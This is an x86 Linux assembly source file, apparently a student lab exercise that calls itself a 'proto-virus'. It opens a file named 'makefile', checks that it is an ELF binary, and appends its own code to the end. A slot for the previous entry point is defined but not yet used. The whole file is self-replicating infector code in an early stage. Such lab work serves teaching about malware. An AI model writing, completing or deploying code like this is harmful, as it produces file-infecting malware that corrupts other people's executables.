%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define ELFHDR_size 52
%define ELFHDR_phoff	28
%define ELF_MAGIC 0x464C457F
%define stdout 1

	global _start

	section .text
_start:	
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	;CODE START
	
	call get_my_loc ;;here we get the location of the next_i
	sub ecx ,next_i - FileName ;;here we get the start of the file
	mov eax,ecx
	open eax,RDWR,0644
	cmp eax,-1
	je VirusExit
	mov esi,eax  ;;to go the place of the file in the stack
	lea ebx,[ebp -64] ;;now the [ebp -64] placed in ebx
	read esi,ebx,ELFHDR_size
	cmp dword[ebp-64],ELF_MAGIC
	jne error_elf
	write stdout,OutStr,31
	lseek esi ,0,2
	write esi,_start,virus_end-_start
	close esi
	jmp VirusExit
	error_elf:
		write stdout,Failstr,12
		jmp VirusExit

start:

VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
	
FileName:	db "makefile", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
	

get_my_loc:
	call next_i
next_i:
	pop ecx
	ret	
PreviousEntryPoint: dd VirusExit
virus_end:



